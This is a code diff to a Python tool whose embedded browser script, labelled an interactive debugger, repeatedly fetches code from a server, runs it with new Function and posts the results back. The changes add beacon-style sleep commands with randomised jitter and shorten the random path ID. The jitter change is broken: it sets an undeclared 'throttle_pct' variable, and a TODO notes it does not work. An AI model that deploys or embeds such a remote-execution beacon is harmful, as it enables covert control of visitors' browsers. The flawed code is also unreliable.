@@ -28,6 +28,10 @@ import json
 import random
 
 try:
+    import readline
+except ImportError:
+    pass
+try:
     from rich.console import Console as RichConsole
     HAS_RICH = True
 except ImportError:
@@ -52,7 +56,7 @@ CORS = {"Access-Control-Allow-Origin": "*"}
 BROWSER_JS = """(function(){
 var b='';try{var s=document.currentScript&&document.currentScript.src;if(s){var u=s.split('?')[0];b=u.substring(0,u.lastIndexOf('/'))}}catch(e){}
 if(!b)b=window.__MOSS_BASE||window.location.origin;
-var i=-1,p=0;
+var i=-1,p=0,pct=10,sleepy=5;
 function generateId(length = 6) {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let id = '';
@@ -63,11 +67,23 @@ function generateId(length = 6) {
 }
 var nm = generateId();
 
-function n(){setTimeout(function(){if(!p)r()},2e3)}
-function r(){p=1;fetch(b+'/debugger/{RANDOM}/pending?name='+nm+'&last_id='+i,{credentials:'omit'}).then(function(x){if(!x.ok)throw Error(x.status);return x.json()}).then(function(c){
-c.forEach(function(m){var a,d;try{var f=new Function('return '+m.code);a=f();a=a===void 0?'undefined':String(a)}catch(e){d=String(e)}
-var g={id:m.id,name:nm};d?g.error=d:g.result=a;fetch(b+'/debugger/{RANDOM}/result',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(g),credentials:'omit'}).catch(function(){});i=m.id});p=0;n()}).catch(function(){p=0;n()})}
+function n(){
+setTimeout(function(){if(!p)r()},sleepy*1000 + sleepy*1000*(Math.random()*2*pct - pct)/100)}
+function r(){p=1;fetch(b+'{DEBUGGER_PATH}/pending?name='+nm+'&last_id='+i,{credentials:'omit'}).then(function(x){if(!x.ok)throw Error(x.status);return x.json()}).then(function(c){
+c.forEach(function(m){
+console.log('cmd:', m.code);
+if (m.code.toLowerCase().startsWith('sleep ')) {
+ const [_, sl, thr] = m.code.split(' ');
+ console.log('sleep:', 'sl=', sl, 'thr=', thr)
+ if (sl && Number(sl)) sleepy = Number(sl);
+ if (thr && Number(thr)) throttle_pct = Number(thr);
+ return;
+}
+var a,d;try{var f=new Function('return '+m.code);a=f();a=a===void 0?'undefined':String(a)}catch(e){d=String(e)}
+var g={id:m.id,name:nm};d?g.error=d:g.result=a;fetch(b+'{DEBUGGER_PATH}/result',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(g),credentials:'omit'}).catch(function(){});i=m.id});p=0;n()}).catch(function(){p=0;n()})}
 r()})();"""
+
+# TODO: jitter doesn't seem to work, fix later
 
 # ────────────────────────────────────────────────
 #   Mixin — CLI flags, shared state, input thread
@@ -83,7 +99,7 @@ def random_id(n: int):
 class DebuggerMixin:
     debugger_path: str = _field("/debugger/{RANDOM}", group=GROUP, flags=["--debugger-path"], doc="URL path for the interactive debugger JS payload. Use {RANDOM} to insert a random ID in the path")
     debugger_no_input: bool = _field(False, group=GROUP, flags=["--debugger-no-input"], doc="Disable the TUI input thread (for testing)")
-    debugger_random_id_length: int = _field(8, group=GROUP, flags=["--debugger-id-length"], doc="The length of the random ID. Consider using the --block-scanners flag to mitigate against brute-forcing. Set to 0 to replace {RANDOM} with nothing")
+    debugger_random_id_length: int = _field(6, group=GROUP, flags=["--debugger-id-length"], doc="The length of the random ID. Consider using the --block-scanners flag to mitigate against brute-forcing. Set to 0 to replace {RANDOM} with nothing")
 
     def __post_init__(self):
         self._pending = []
@@ -98,10 +114,9 @@ class DebuggerMixin:
         if self.debugger_random_id_length > 0:
             instance_id = random_id(self.debugger_random_id_length)
             self.debugger_path = self.debugger_path.replace("{RANDOM}", instance_id)
-            self._browser_js = self._browser_js.replace("{RANDOM}", instance_id)
         else:
             self.debugger_path = self.debugger_path.replace("/{RANDOM}", "")
-            self._browser_js = self._browser_js.replace("/{RANDOM}", "")
+        self._browser_js = self._browser_js.replace("{DEBUGGER_PATH}", self.debugger_path)
 
         if not HAS_RICH:
             self.warning(f"debugger works best with the rich package:")
